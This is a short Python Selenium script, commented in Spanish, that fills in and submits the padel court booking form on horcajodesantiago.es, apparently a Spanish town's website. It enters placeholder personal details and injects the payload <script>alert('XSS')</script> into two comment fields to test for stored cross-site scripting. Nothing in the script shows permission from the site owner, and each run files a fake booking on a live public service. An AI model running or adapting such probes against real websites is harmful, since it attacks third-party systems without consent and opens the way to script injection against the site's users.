from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

driver = webdriver.Chrome()  # Asegúrate de tener chromedriver instalado
driver.get("https://www.horcajodesantiago.es/reserva-pistas/pista-de-padel/")

# Rellena los campos (ajusta los selectores según el HTML real)
driver.find_element(By.NAME, "nombre").send_keys("Prueba")
driver.find_element(By.NAME, "apellidos").send_keys("XSS")
driver.find_element(By.NAME, "telefono").send_keys("123456789")
driver.find_element(By.NAME, "email").send_keys("prueba@example.com")
driver.find_element(By.NAME, "informacion_adicional").send_keys("<script>alert('XSS')</script>")
driver.find_element(By.NAME, "notas").send_keys("<script>alert('XSS')</script>")

# Marca la casilla de aceptación de términos si es necesario
driver.find_element(By.NAME, "aceptar_terminos").click()

# Envía el formulario
driver.find_element(By.ID, "submit").click()

# Espera y observa si aparece la alerta
input("Presiona Enter para cerrar el navegador...")
driver.quit()